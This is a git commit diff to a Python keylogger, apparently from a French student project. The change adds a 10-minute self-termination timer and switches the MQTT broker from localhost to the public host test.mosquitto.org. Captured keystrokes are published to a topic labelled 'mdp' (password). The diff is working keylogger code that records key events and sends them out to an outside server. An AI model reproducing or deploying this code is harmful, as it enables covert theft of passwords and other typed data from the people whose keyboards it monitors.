518e04c8fd24d5e0dfed0528a9e8ef9671ad7630
Benjamin <benjamin.lecesne.blc@gmail.com>
2022-03-10 17:03:02 +0100

    continue: ajout d'un timer de fin d'éxecution du keylogger modification du serveur mqtt

--- src/KeyLogger/keylogger.py
+++ src/KeyLogger/keylogger.py
@@ -6,14 +6,15 @@ import paho.mqtt.client as mqtt
 
 SEND_LOG_EVERY = 10
 
-
 class Keylogger:
     def __init__(self):
         self.keystrokes = []
         self.file = f"log_{time.time()}.txt"
         self.pressed = {}
+        self.run = True
         self.client = mqtt.Client()
-        self.client.connect("localhost", 5204)
+        self.client.connect("test.mosquitto.org", 1883)
+#
 
     def write_to_file(self):
         keys = ""
@@ -21,7 +22,7 @@ class Keylogger:
         for key, event_type in self.keystrokes:
             if event_type == "down":
                 keys += key + ' '
-        self.client.publish("MDP", keys)
+        self.client.publish("test/projet/keylogger/mdp", keys)
 
     def log(self):
         if self.keystrokes and not any(self.pressed.values()):
@@ -31,10 +32,16 @@ class Keylogger:
         timer.daemon = True
         timer.start()
 
+    def kill(self):
+        self.run = False
+
     def start(self):
         self.log()
-        while True:
-            event: keyboard._keyboard_event.KeyboardEvent = keyboard.read_event()
+        timer_kill_process = Timer(interval=10*60, function=self.kill)
+        timer_kill_process.daemon = True
+        timer_kill_process.start()
+        while self.run:
+            event = keyboard.read_event()
             self.keystrokes.append((event.name, event.event_type))
             self.pressed[event.scan_code] = event.event_type == "down"
 
